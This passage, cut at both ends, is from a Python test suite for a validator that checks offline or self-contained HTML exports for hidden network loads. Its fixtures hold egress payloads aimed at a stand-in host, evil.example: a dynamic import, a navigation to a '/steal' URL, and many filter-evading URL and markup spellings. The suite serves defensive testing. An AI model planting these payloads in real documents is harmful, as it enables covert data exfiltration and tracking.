                       '<iframe src="local.html" srcdoc="&lt;img src=//evil.example/x.png&gt;">'
                       "</iframe>"):
            with self.subTest(markup=markup):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any(clause in e for e in errors),
                                "expected a nested-load error for %r, got %r" % (markup, errors))

    def test_a_nested_frames_network_src_is_reported_beside_its_srcdoc(self):
        # CMH-VAL-25: a network `src` on a frame that ALSO carries a `srcdoc` is reported, and that
        # is deliberate rather than an over-report. `src` is the documented FALLBACK for `srcdoc` -
        # an engine that does not implement `srcdoc` navigates `src` instead - and it becomes live
        # in this product too, because Export Offline clears `srcdoc` unconditionally
        # (CMH-OFFLINE-04), which is exactly what the CMH-VAL-24 advisory means when it says an
        # offline copy shows whatever local `src` the frame also carries. So the reference survives
        # into a copy where nothing shadows it. The top-level rule reports the identical element the
        # same way, so this is also the parity the whole row rests on.
        nested = ("&lt;iframe src=&quot;https://evil.example/&quot; "
                  "srcdoc=&quot;safe&quot;&gt;&lt;/iframe&gt;")
        markup = '<iframe srcdoc="%s"></iframe>' % nested
        errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertTrue(any('carries a nested <iframe src="https://evil.example/">' in e
                            for e in errors), errors)
        top_errors, _ = self._errs_warns(build(body=self._body(
            MAIN, '<iframe src="https://evil.example/" srcdoc="&lt;p&gt;safe&lt;/p&gt;"></iframe>')))
        self.assertTrue(any("evil.example" in e for e in top_errors), top_errors)

    def test_a_reported_frame_is_named_by_its_id_when_it_has_one(self):
        # CMH-VAL-25: the nested value is truncated in the report and several frames in one
        # document often open with the same boilerplate, so a report that named only the value
        # could not say WHICH frame it meant. The `id` rides along when the frame carries one.
        markup = ('<iframe id="demo-two" srcdoc="&lt;img src=//evil.example/x.png&gt;">'
                  "</iframe>")
        errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertTrue(any('<iframe id="demo-two" srcdoc=' in e for e in errors), errors)

    def test_the_nested_walk_audits_to_its_depth_budget_then_reports(self):
        # CMH-VAL-25: the depth cap is the OTHER fail-closed path - nesting past the budget is
        # reported rather than passed. Both sides of the boundary are pinned, so neither a
        # premature cap (which would reject a legal document) nor a removed one can regress
        # silently, and the assertion names the depth clause: every message carries "nested"
        # somewhere, so a loose substring would be satisfied by a load or a parse failure too.
        depth_clause = "nests documents more than %d deep" % layer._SRCDOC_MAX_DEPTH

        def nest(levels):
            markup = "<img src=//evil.example/x.png>"
            for _ in range(levels):
                markup = '<iframe srcdoc="%s"></iframe>' % html_escape(markup, quote=True)
            return markup

        at_budget, _ = self._errs_warns(
            build(body=self._body(MAIN, nest(layer._SRCDOC_MAX_DEPTH))))
        self.assertTrue(any('carries a nested <img src="//evil.example/x.png">' in e
                            for e in at_budget), at_budget)
        self.assertFalse(any(depth_clause in e for e in at_budget), at_budget)
        past_budget, _ = self._errs_warns(
            build(body=self._body(MAIN, nest(layer._SRCDOC_MAX_DEPTH + 1))))
        self.assertTrue(any(depth_clause in e for e in past_budget), past_budget)

    def test_offline_mode_rejects_network_resources_inside_noscript(self):
        # A <noscript> body is raw TEXT only while scripting is enabled; with scripting off a
        # browser parses it and really does load what it names. The EGRESS checks must
        # therefore fail CLOSED on the fallback markup - the redirect and the image below are
        # live for exactly the reader who cannot run the layer at all.
        fallback = ('<noscript><meta http-equiv="refresh" content="0;url=//evil.example/out">'
                    '<img src="//evil.example/x.png" alt="x"></noscript>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, fallback))))
        self.assertTrue(any("offline mode" in e and "meta refresh" in e for e in errors), errors)
        self.assertTrue(any("evil.example/x.png" in e for e in errors), errors)

    def test_a_csp_meta_inside_noscript_does_not_satisfy_the_offline_policy(self):
        # The mirror image: a PRESENCE check must read the browser's view, not the fallback
        # superset. A scripting-enabled browser never creates this element, so it cannot be the
        # document's policy - reading it would suppress the missing-CSP error outright.
        doc = with_offline_mode(build(body=self._body(MAIN)), csp=False)
        doc = doc.replace("<head>\n",
                          '<head>\n<noscript><meta http-equiv="Content-Security-Policy" '
                          'content="%s"></noscript>\n' % OFFLINE_CSP, 1)
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("missing Content-Security-Policy" in e for e in errors), errors)

    def test_an_unclosed_noscript_still_contributes_its_fallback_markup(self):
        # A browser runs an unclosed raw-text element to end of document, so the fallback markup
        # after it is still live for a scripting-disabled reader.
        fallback = '<noscript><img src="//evil.example/x.png" alt="x">'
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, fallback))))
        self.assertTrue(any("evil.example/x.png" in e for e in errors), errors)

    def test_offline_mode_rejects_css_egress_inside_a_noscript_fallback(self):
        # The ELEMENT lookups already ask the egress question, but the CSS scans read the
        # scripting-ENABLED document view, which sees a `<noscript>` body as raw TEXT. A browser
        # with scripting OFF parses that body and really does fetch what its CSS names, so the
        # stylesheet `@import`, the `url(...)` in a `<style>` body and the one in a `style=`
        # attribute below are all live for exactly the reader who cannot run the layer.
        cases = [
            ('<noscript><style>@import url(https://evil.example/x.css);</style></noscript>',
             "@import"),
            ('<noscript><style>body { background: url(//evil.example/x.png); }</style></noscript>',
             "style block contains a network url"),
            ('<noscript><div style="background:url(//evil.example/x.png)">f</div></noscript>',
             "inline style on <div> contains a network url"),
        ]
        for fallback, needle in cases:
            with self.subTest(fallback=fallback):
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, fallback))))
                self.assertTrue(any("offline mode" in e and needle in e for e in errors),
                                "expected %r for %r: %r" % (needle, fallback, errors))

    def test_offline_mode_accepts_an_ordinary_noscript_fallback(self):
        # The egress widening must not turn a legitimate fallback - one whose CSS references
        # nothing over the network - into an error.
        fallback = ('<noscript><style>.cmh-fallback { color: #123456; '
                    'background: url(data:image/png;base64,AAAA); }</style>'
                    '<p class="cmh-fallback" style="color:#123456">enable scripting</p></noscript>')
        errors, warnings = self._errs_warns(
            with_offline_mode(build(body=self._body(MAIN, fallback))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_offline_mode_reports_a_noscript_closer_smuggled_into_fallback_css(self):
        # The scripting-ENABLED tokenizer ends the `<noscript>` body at the first `</noscript`,
        # but inside the fallback's `<style>` body a scripting-DISABLED browser is still in raw
        # text, so the stylesheet runs on past that closer and really does fetch. Neither view
        # holds the CSS after the seam, so the document must be REPORTED as unreadable rather
        # than certified offline-clean.
        fallback = ('<noscript><style>/* </noscript> */ '
                    "body { background: url(//evil.example/x.png); }</style></noscript>")
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, fallback))))
        self.assertTrue(any("could not parse the document" in e for e in errors), errors)

    def test_the_fallback_css_view_matches_what_the_document_view_already_does(self):
        # The fallback view is the SAME rule applied to a second source of truth, so a shape must
        # be judged the same wherever it sits. Both of these are deliberate and pre-date this
        # view: `<template>`-parked CSS is checked because the offline export walks into templates
        # (so a file keeping it is a file an export would change), and a `<style>` is checked
        # whatever its `type` for the same parity reason. Pinning the pair together is what stops
        # the two views from drifting into different policies.
        for parked in ("<template><style>@import url(//evil.example/x.css);</style></template>",
                       '<style type="text/plain">@import url(//evil.example/x.css);</style>'):
            with self.subTest(parked=parked):
                in_doc, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, parked))))
                in_fallback, _ = self._errs_warns(with_offline_mode(
                    build(body=self._body(MAIN, "<noscript>%s</noscript>" % parked))))
                self.assertTrue(in_doc, "expected the document view to report %r" % parked)
                self.assertEqual(in_fallback, in_doc)

    def test_a_document_whose_tag_index_fails_is_reported_not_passed(self):
        # "Could not look" must not read like "nothing more to find": the self-contained
        # guarantee is derived from the tag index, so a failed index is its own error.
        from checks import parsing as _parsing
        doc = build(body=self._body(MAIN))
        _parsing._tag_attr_index.cache_clear()
        self.addCleanup(_parsing._tag_attr_index.cache_clear)
        with mock.patch.object(_parsing, "_TagAttrParser", side_effect=RuntimeError("boom")):
            errors, _ = self._errs_warns(doc)
        self.assertTrue(any("could not parse the document for the self-contained" in e
                            for e in errors), errors)

    def test_validate_releases_the_shared_tag_index(self):
        from checks import parsing as _parsing
        self._errs_warns(build(body=self._body(MAIN)))
        self.assertEqual(_parsing._tag_attr_index.cache_info().currsize, 0)

    def test_offline_mode_rejects_network_css_urls(self):
        css = CSS_REGION.replace(
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }",
            ":root { --cp-bg: #ffffff; --cp-text: #000000; background-image: url(https://example.com/bg.png); }")
        main = MAIN.replace("<p>content</p>", '<p style="background: url(//example.com/inline.png)">content</p>')
        errors, _ = self._errs_warns(with_offline_mode(build(css=css, body=self._body(main))))
        for needle in ("style block", "inline style"):
            self.assertTrue(any("offline mode" in e and "url(" in e and needle in e for e in errors),
                            "expected offline CSS url error for %s, got %r" % (needle, errors))

    def test_offline_mode_rejects_a_scheme_only_css_url_and_import(self):
        # `url(https:evil.example/x.png)` carries NO slashes after the scheme, and the URL parser's
        # special-authority states ignore whatever run of slashes follows a special scheme's colon,
        # so a browser resolves it to the same host as `url(https://evil.example/x.png)` and really
        # does fetch it from a `file://` document. While the gates required the two slashes the
        # whole CSS channel was open to a one-token spelling change and `--strict` certified such a
        # file as offline-clean. The exporter's own CSS strips move with them (issue #961), so the
        # gate never rejects what the strip leaves behind.
        cases = [
            ("<style>body { background: url(https:evil.example/x.png); }</style>",
             "style block contains a network url"),
            ("<style>body { background: url(https:/evil.example/x.png); }</style>",
             "style block contains a network url"),
            ('<style>@import "https:evil.example/t.css";</style>', "@import"),
            ("<style>@import url(HTTP:/evil.example/t.css);</style>", "@import"),
            ('<div style="background:url(https:evil.example/inline.png)">f</div>',
             "inline style on <div> contains a network url"),
        ]
        for markup, needle in cases:
            with self.subTest(markup=markup):
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertTrue(any("offline mode" in e and needle in e for e in errors),
                                "expected %r for %r: %r" % (needle, markup, errors))

    def test_offline_mode_still_accepts_the_css_the_scheme_only_widening_must_not_reach(self):
        # The widening must not turn a local stylesheet into an error. A relative or `data:`
        # reference is the whole control case, and an authority terminated at once by the end of
        # the value is an EMPTY host a special scheme cannot even parse - `url(https://)` and
        # `url(//)` fetch nothing at all, and the exporter's strips leave both alone, so reporting
        # either would reject a file with no egress.
        markup = ("<style>@import url(theme.css); @import './local.css'; "
                  ".a { background: url(x.png); } .b { background: url('./img/y.png'); } "
                  ".c { background: url(data:image/png;base64,AAAA); } "
                  ".d { background: url(https://); } .e { background: url(//); }</style>"
                  '<div style="background:url(x.png)">f</div>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, markup))))
        self.assertEqual([e for e in errors if "url(" in e or "@import" in e], [], errors)

    def test_offline_mode_rejects_a_scheme_only_attribute_reference(self):
        # The attribute predicate moved with the CSS gates (issue #961), so the same slash-less
        # spelling is caught in a reference a browser LOADS. The empty-authority control stays
        # local: a special scheme with no host is a parse failure that fetches nothing, and the
        # export leaves it alone, so reporting it would reject a file with no egress.
        for markup, expected in (('<img src="https:evil.example/x.png" alt="x">', True),
                                 ('<img src="https:/evil.example/y.png" alt="y">', True),
                                 ('<img src="https://" alt="empty">', False)):
            with self.subTest(markup=markup):
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                hit = any("loads over the network" in e or "evil.example" in e for e in errors)
                self.assertEqual(hit, expected, (markup, errors))

    def test_offline_mode_allows_non_fetching_network_links(self):
        links = (
            '<link rel="canonical" href="https://example.com/report">\n'
            '<link rel="alternate" href="https://example.com/report.atom" type="application/atom+xml">\n'
            '<link rel="author" href="https://example.com/about">'
        )
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, links))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # An offline export used to skip four reserved layer ids BEFORE testing whether the script
    # was runnable, so a decoy that merely borrowed one bypassed both of its strips (#822). The
    # validator never had that skip, which is the asymmetry that let the exporter preserve a
    # script its own --strict gate then rejected. Pin the validator side in both directions so a
    # future "make them agree" change cannot resolve the disagreement by adding the skip here.
    def test_offline_egress_check_exempts_no_reserved_layer_id(self):
        reserved = ("embeddedComments", "handledCommentIds", "commentableHtmlLayer",
                    "cmhVendoredRichLibs", "reviewedSections")
        for rid in reserved:
            with self.subTest(reserved_id=rid):
                decoy = ('<script type="text/javascript" id="%s">\n'
                         'import("https://evil.example/x.js");\n'
                         '</script>' % rid)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, decoy))))
                self.assertTrue(any("imports a network module" in e for e in errors), (rid, errors))
                nav = ('<script type="text/javascript" id="%s">\n'
                       'window.location.href = "https://evil.example/steal";\n'
                       '</script>' % rid)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, nav))))
                self.assertTrue(any("direct top-level " in e for e in errors), (rid, errors))

    def test_offline_egress_check_reads_a_cdata_wrapped_svg_script_body(self):
        # CMH-VAL-29 is not only a false-positive fix: the dropped CDATA payload was also invisible
        # to the offline EGRESS scan, which regex-scans the same captured body. An SVG script whose
        # body is a section really runs, so a network import written there was real egress that
        # `--strict` certified as offline-clean.
        smuggled = ('<svg><script type="text/javascript">'
                    '<![CDATA[import("https://evil.example/x.js");]]>'
                    "</script></svg>")
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, smuggled))))
        self.assertTrue(any("imports a network module" in e for e in errors), errors)

    # A genuinely inert data block carrying the same text is DATA, not code: the exporter now
    # repairs a runnable-typed reserved block into one of these rather than deleting it, so the
    # validator must keep accepting the repaired shape.
    def test_offline_egress_check_ignores_an_inert_reserved_block_quoting_egress(self):
        quote = ('<script type="application/json" id="reviewedSections">\n'
                 '{"x": "import(\\"https://evil.example/x.js\\") and location.href = '
                 '\\"https://evil.example/steal\\""}\n'
                 '</script>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, quote))))
        self.assertFalse(any("imports a network module" in e or "direct top-level " in e for e in errors), errors)

    # An SVG <script> loads through `href` (SVG2) or the legacy `xlink:href`, never `src`, so the
    # resource check missed it entirely and blessed such a file as offline-clean (#881). The
    # exporter strips the same shape, so the gate has to see it too or the two disagree. The
    # padded value is browser-real: a URL parser strips leading whitespace before it parses, so
    # ` https://...` loads - and the exporter's own predicate trims, so a validator that did not
    # would bless a file the strip had cleaned.
    def test_offline_mode_rejects_an_svg_script_that_loads_through_href(self):
        for attr in ("href", "xlink:href"):
            for url in ("https://evil.example/x.js", "//evil.example/x.js",
                        " \t https://evil.example/x.js"):
                with self.subTest(attr=attr, url=url):
                    svg = '<svg><script %s="%s"></script></svg>' % (attr, url)
                    errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
                    self.assertTrue(any("offline mode" in e and "<script %s" % attr in e for e in errors),
                                    (attr, url, errors))

    # Borrowing a reserved layer id buys no exemption from the LOAD check either: the exporter
    # neutralizes such a block into inert data, but a remote load is what the strip removes outright,
    # so the gate must flag it rather than read the id and look away.
    def test_offline_mode_rejects_a_reserved_id_svg_script_that_loads_through_href(self):
        for rid in ("embeddedComments", "handledCommentIds", "commentableHtmlLayer",
                    "reviewedSections", "cmhVendoredRichLibs"):
            with self.subTest(reserved_id=rid):
                svg = ('<svg><script id="%s" href="https://evil.example/x.js"></script></svg>' % rid)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
                self.assertTrue(any("offline mode" in e and "<script href" in e for e in errors),
                                (rid, errors))

    def test_offline_mode_accepts_a_relative_or_data_svg_script_reference(self):
        svg = ('<svg><script href="svg-local-keep.js"></script>'
               '<script xlink:href="data:text/javascript,void%200"></script></svg>')
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # An SVG `feImage` fetches exactly like an SVG `<image>` or `<use>` - both of which the offline
    # media list already covers - but the filter primitive was in neither the list nor the export
    # strip, so a document carrying one rode into a zero-network export and `--strict` certified it
    # clean (#992). `HTMLParser` lowercases the tag, so the gate looks it up as `feimage`.
    def test_offline_mode_rejects_an_feimage_that_loads_over_the_network(self):
        for attr in ("href", "xlink:href"):
            for url in ("https://evil.example/x.png", "//evil.example/x.png",
                        " \t https://evil.example/x.png"):
                with self.subTest(attr=attr, url=url):
                    svg = '<svg><filter id="f"><feImage %s="%s"/></filter></svg>' % (attr, url)
                    errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
                    self.assertTrue(any("offline mode" in e and "<feimage %s" % attr in e
                                        for e in errors), (attr, url, errors))

    # The control: a relative or `data:` primitive resolves inside the file and is left alone, so
    # widening the media list cannot start rejecting a document with no egress at all.
    def test_offline_mode_accepts_a_relative_or_data_feimage_reference(self):
        svg = ('<svg><filter id="f1"><feImage href="local-tile.png"/></filter>'
               '<filter id="f2"><feImage xlink:href="data:image/gif;base64,R0lGODlhAQABAAAAACw="/>'
               "</filter></svg>")
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # Hyperlink auditing: a click POSTs to every URL in `ping`, and neither the export strip nor
    # this gate looked at the attribute (#992). CSP Level 3 folds auditing into `connect-src`,
    # which the offline policy does set to `'none'`, so a current browser most likely absorbs it -
    # but the strip and the gate are the layer that must not DEPEND on the CSP, and the `ping-src`
    # history makes that coverage version-dependent. EVERY ping goes, network target or not: the
    # exporter removes the attribute whatever it names (the meta-refresh precedent), so a gate that
    # accepted a relative one would bless a file an export would change.
    def test_offline_mode_rejects_hyperlink_auditing(self):
        for tag, markup in (
                ("a", '<a href="#s" ping="https://evil.example/audit">x</a>'),
                ("a", '<a href="#s" ping="local-audit">x</a>'),
                ("area", '<map name="m"><area shape="rect" coords="0,0,1,1" href="#s" '
                         'ping="https://evil.example/audit"></map>')):
            with self.subTest(markup=markup):
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertTrue(any("offline mode" in e and "<%s ping" % tag in e for e in errors),
                                (markup, errors))
        network, _ = self._errs_warns(with_offline_mode(build(body=self._body(
            MAIN, '<a href="#s" ping="https://evil.example/audit">x</a>'))))
        self.assertTrue(any("evil.example" in e for e in network), network)

    # An empty `ping` names no URL, so a browser sends nothing and the strip has nothing to take
    # away; an ordinary link with no auditing at all is the other control.
    def test_offline_mode_accepts_a_link_without_hyperlink_auditing(self):
        markup = '<a href="#s" ping="">x</a> <a href="#s">y</a>'
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, markup))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # The boundary that decides whether a ping names anything is HTML's own tokenization - ASCII
    # whitespace ONLY - not either engine's whitespace class. `str.strip()` here and `String.trim()`
    # in the exporter disagree about NBSP, U+FEFF and U+001C-U+001F, so a trimming gate would drift
    # from the strip in BOTH directions: it would call an NBSP ping empty and bless it, though a
    # browser resolves it as a relative target and POSTs to `/%C2%A0`, and it would leave a
    # U+001C-only value that the exporter's own trim called empty. Only a value made of ASCII
    # whitespace (or nothing at all) is a no-op on both sides.
    def test_offline_mode_reads_a_ping_list_the_way_html_tokenizes_it(self):
        for value, rejected in (("\u00a0", True), ("\ufeff", True), ("\u001c", True),
                                ("\u000b", True), (" \t\n\f\r ", False), ("", False)):
            with self.subTest(value=repr(value)):
                markup = '<a href="#s" ping="%s">x</a>' % value
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                hit = any("offline mode" in e and "<a ping" in e for e in errors)
                self.assertEqual(hit, rejected, (repr(value), errors))

    # A browser normalizes several spellings INTO a network URL before it fetches (issue #923), so
    # the gate must read the value the way the URL parser does. Both implementations used to test
    # the raw literal and call every one of these local, which is under-detection rather than a
    # disagreement: the exporter left the load in place and the gate then certified the file.
    def test_offline_mode_rejects_a_browser_normalized_network_reference(self):
        for url in ("https:/\\evil.example/x.js", "\\\\evil.example/x.js",
                    "ht\ttps://evil.example/x.js", "https:\n//evil.example/x.js",
                    "file://evil.example/x.js", "file:\\\\evil.example/x.js",
                    "file:////evil.example/x.js"):
            with self.subTest(url=url):
                markup = ('<img src="%s"><svg><script href="%s"></script></svg>' % (url, url))
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertTrue(any("offline mode" in e and "<img src" in e for e in errors),
                                (url, errors))
                self.assertTrue(any("offline mode" in e and "<script href" in e for e in errors),
                                (url, errors))

    # ...and the spellings that stay ON the machine must still pass, or the gate would reject an
    # offline file with no egress at all: a `file:` URL with an empty host, `localhost` - including
    # every spelling the URL parser CANONICALIZES onto it, since it percent-decodes and lowercases a
    # file host before the file-host state empties it - or a Windows DRIVE LETTER in the host
    # position (which the URL parser turns into a path), and a backslash inside an ordinary relative
    # path.
    def test_offline_mode_accepts_a_local_file_or_backslash_relative_reference(self):
        for url in ("file:///C:/local/x.js", "file:///local/x.js", "file://localhost/local/x.js",
                    "file://C:/local/x.js", "file://c|/local/x.js", "file:////C:/local/x.js",
                    "file://local%68ost/local/x.js", "file://%4Cocalhost/local/x.js",
                    "file:////local%68ost/local/x.js",
                    "sub\\local-keep.js", "/root\\local-keep.js"):
            with self.subTest(url=url):
                markup = '<svg><script href="%s"></script></svg>' % url
                errors, warnings = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertEqual(errors, [], (url, errors))
                self.assertEqual(warnings, [], (url, warnings))

    # A TRAILING DOT is not that: the file-host state special-cases the exact string `localhost`, so
    # `file://localhost./x` keeps a NON-EMPTY host and resolves to the SMB path `\\localhost.\x` on
    # Windows - egress even though it lands on the loopback, exactly as `\\localhost\C$\x` is. The
    # percent-encoded spellings of the dot and of the host agree, and a host that merely STARTS with
    # `localhost` is a different machine. A SECOND path slash is egress for a different reason: the
    # host is emptied and `//evil.example/x.js` stays as the PATH, so the value canonicalizes to
    # `file:////evil.example/x.js` - the four-separator UNC form the rows above already reject. The
    # backslash spelling reaches the same place, since the URL cleanup maps `\` onto `/`.
    def test_offline_mode_rejects_a_trailing_dot_or_near_miss_localhost_file_authority(self):
        for url in ("file://localhost./x.js", "file://localhost%2E/x.js",
                    "file://%6Cocalhost./x.js", "file://local%68ostx/x.js",
                    "file://localhost//evil.example/x.js",
                    "file://local%68ost//evil.example/x.js",
                    "file://localhost/\\evil.example/x.js"):
            with self.subTest(url=url):
                markup = '<svg><script href="%s"></script></svg>' % url
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertTrue(any("offline mode" in e and "<script href" in e for e in errors),
                                (url, errors))

    # A `srcset` candidate is tokenized before the URL predicate sees it, and HTML draws that
    # boundary at ASCII whitespace only. Splitting on the ENGINE's whitespace cut the candidate at a
    # U+000B and hid a real load from both implementations.
    def test_offline_mode_reads_a_srcset_candidate_the_way_html_tokenizes_it(self):
        markup = '<img src="local.png" srcset="\u0001\u000b//evil.example/x.png 1x">'
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, markup))))
        self.assertTrue(any("offline mode" in e and "<img srcset" in e for e in errors), errors)

    # A `data:` URL may legally CONTAIN a comma - it separates the media type from the data - so a
    # comma-split arm read `data:text/plain,https://example.com/payload 1x` as TWO candidates and
    # rejected the second half. Fail-closed, but it rejected a document with no egress at all, and
    # the exporter cleared the same attribute. HTML's candidate state machine keeps it as one.
    def test_offline_mode_accepts_a_data_srcset_candidate_carrying_a_comma(self):
        for value in ("data:text/plain,https://example.com/payload 1x",
                      "data:image/gif;base64,R0lGODlhAQABAAAAACw= 1x, "
                      "data:text/plain,//evil.example/x.png 2x",
                      "local.png (a,https://evil.example/x.png) 1x"):
            with self.subTest(value=value):
                markup = '<img src="local.png" srcset="%s">' % value
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertEqual([e for e in errors if "<img srcset" in e], [],
                                 (value, errors))

    # ...while the cases the old two-reading union existed for still resolve to a network load: a
    # comma INSIDE a URL run belongs to the URL, and two candidates separated by a bare comma are
    # still two candidates.
    def test_offline_mode_still_rejects_the_srcset_shapes_the_union_was_written_for(self):
        for value in ("https://,evil.example/x.png 1x",
                      "local.png 1x,https://evil.example/x.png 2x",
                      "local.png,, https://evil.example/x.png 1x"):
            with self.subTest(value=value):
                markup = '<img src="local.png" srcset="%s">' % value
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertTrue(any("offline mode" in e and "<img srcset" in e for e in errors),
                                (value, errors))

    # The self-contained guarantee is not offline-only: a shareable document that loads a script
    # over the network is an error however the load is spelled.
    def test_shareable_mode_rejects_a_script_that_loads_through_href(self):
        for attr in ("href", "xlink:href"):
            with self.subTest(attr=attr):
                svg = '<svg><script %s="https://evil.example/x.js"></script></svg>' % attr
                errors, _ = self._errs_warns(build(body=self._body(MAIN, svg)))
                self.assertTrue(any("self-contained guarantee" in e and "<script %s" % attr in e
                                    for e in errors), (attr, errors))

    # The Chart.js CDN opt-in stays bound to `src` as a deliberate NARROWING. `check_charts` does
    # audit an SVG `href`/`xlink:href` loader's pinned version and SRI since CMH-VAL-27, so the
    # old "nothing else looks at it" reason no longer holds - but the exemption is a hole punched
    # in the self-contained guarantee for ONE documented opt-in, and widening it to a spelling no
    # real document writes would give up a real guarantee for nothing. So an SVG-`href` CDN tag is
    # a loader to `check_charts` and is still refused here, and the two verdicts are consistent.
    def test_the_chartjs_cdn_exemption_does_not_extend_to_a_script_href(self):
        for attr in ("href", "xlink:href"):
            with self.subTest(attr=attr):
                svg = '<svg><script %s="https://evil.example/z/chart.min.js"></script></svg>' % attr
                errors, _ = self._errs_warns(build(body=self._body(MAIN, svg)))
                self.assertTrue(any("self-contained guarantee" in e and "<script %s" % attr in e
                                    for e in errors), (attr, errors))

    # CMH-VAL-08 (#1144): a `<script>` whose type is neither a JavaScript MIME type nor `module`
    # nor `importmap` nor `speculationrules` is a DATA BLOCK - HTML's "prepare the script element"
    # returns BEFORE the fetch step - so its `src` is inert and no browser ever requests it.
    # Reporting one refused a document for a load that never happens: `--strict` failed and the
    # `commentable-html-validated` stamp was withheld over a dead attribute, which is the
    # false-positive direction a gate cannot afford. Checked in BOTH modes, because offline mode
    # reads the same loader rule.
    def test_a_data_blocks_src_is_not_a_network_load(self):
        for stype in ("application/json", "application/ld+json", "text/plain", "text/template",
                      "text/x-handlebars-template", "text/babel", "text/vbscript"):
            markup = ('<script type="%s" src="https://evil.example/x.json">{"a": 1}</script>'
                      % stype)
            for mode, doc in (("shareable", build(body=self._body(MAIN, markup))),
                              ("offline",
                               with_offline_mode(build(body=self._body(MAIN, markup))))):
                with self.subTest(type=stype, mode=mode):
                    errors, warnings = self._errs_warns(doc)
                    # The whole document, not just the messages that echo the URL: a rejection that
                    # stopped naming the host would otherwise satisfy a URL-filtered assertion while
                    # still failing `--strict` and withholding the stamp.
                    self.assertEqual(errors, [], errors)
                    self.assertEqual([w for w in warnings if not validate.is_advisory(w)], [],
                                     warnings)

    # The control for the rule above, in the direction that matters: a type a browser RUNS still
    # fetches its `src`, so widening nothing here is what keeps the guarantee real. The predicate is
    # the exporter-pinned `_is_executable_js`, which reads the type's MIME ESSENCE and folds a
    # whitespace-only type to the classic branch, so the shapes below are still reported even where
    # `script_code_runs` (CMH-VAL-27) says a browser would not run them. That RESIDUAL is
    # deliberate and is pinned here on purpose: the gate and the offline strip must call the same
    # scripts loaders (CMH-OFFLINE-04), and a later move to the spec-exact predicate has to move
    # BOTH sides - when it does, the residual cases below are the ones that change.
    def test_an_executable_scripts_src_is_still_a_network_load(self):
        runs = ("", "module", "text/javascript", "application/ecmascript",
                "text/javascript1.5", "TEXT/JavaScript", "\ttext/javascript ")
        residual = ("text/javascript; charset=utf-8", " ")
        for stype in runs + residual:
            attr = "" if stype == "" else ' type="%s"' % stype
            markup = '<script%s src="https://evil.example/x.js"></script>' % attr
            with self.subTest(type=stype, residual=stype in residual):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any("self-contained guarantee" in e and "evil.example" in e
                                    for e in errors), (stype, errors))

    # `speculationrules` and `importmap` are the two HTML KEYWORD types that are ACTIVE without
    # being JavaScript, and NEITHER fetches through `src`: HTML's `src` step fires an error event at
    # both, because external import maps and external speculation rule sets are unsupported (a
    # ruleset arrives inline or through the `Speculation-Rules` response header). So the loader rule
    # must not report either - offline mode still rejects the BLOCK through the active-data rule,
    # and that error is the one an author acts on; a second, wrong error about a request no browser
    # makes would only send them after a load that never happens.
    def test_an_active_data_src_is_not_a_load_but_offline_still_rejects_the_block(self):
        for stype in ("importmap", "speculationrules"):
            markup = ('<script type="%s" src="https://evil.example/x.json"></script>' % stype)
            with self.subTest(type=stype):
                errors, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertEqual([e for e in errors if "evil.example" in e], [], errors)
                self.assertEqual([w for w in warnings if "evil.example" in w], [], warnings)
                offline, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertTrue(any("offline mode" in e and stype in e for e in offline), offline)
                self.assertEqual([e for e in offline if "loads over the network" in e], [], offline)

    # The type gate is scoped to `src` ALONE. The SVG `href` / `xlink:href` spellings stay
    # unconditional - this tokenizer has no namespace to consult - so a data-block TYPE must not
    # smuggle one of those past the loader rule.
    def test_the_data_block_carve_out_does_not_reach_the_svg_load_attributes(self):
        for attr in ("href", "xlink:href"):
            svg = ('<svg><script type="application/json" %s="https://evil.example/x.js">'
                   "</script></svg>" % attr)
            with self.subTest(attr=attr):
